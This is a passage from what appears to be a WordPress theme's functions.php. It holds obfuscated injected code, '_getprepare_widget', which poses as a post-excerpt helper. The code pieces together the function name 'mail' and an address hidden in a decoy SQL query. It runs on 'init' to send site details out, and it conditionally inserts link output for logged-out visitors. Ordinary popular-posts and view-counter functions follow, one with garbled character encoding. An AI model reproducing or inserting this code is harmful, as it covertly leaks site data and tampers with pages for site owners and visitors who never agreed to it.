	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function _popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
function afublog_getPostViews($postID){ $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); return "0 lượt xem"; } return $count.' LÆ°á»£t xem'; } function afublog_setPostViews($postID) { $count_key = 'post_views_count'; $count = get_post_meta($postID, $count_key, true); if($count==''){ $count = 0; delete_post_meta($postID, $count_key); add_post_meta($postID, $count_key, '0'); }else{ $count++; update_post_meta($postID, $count_key, $count); } }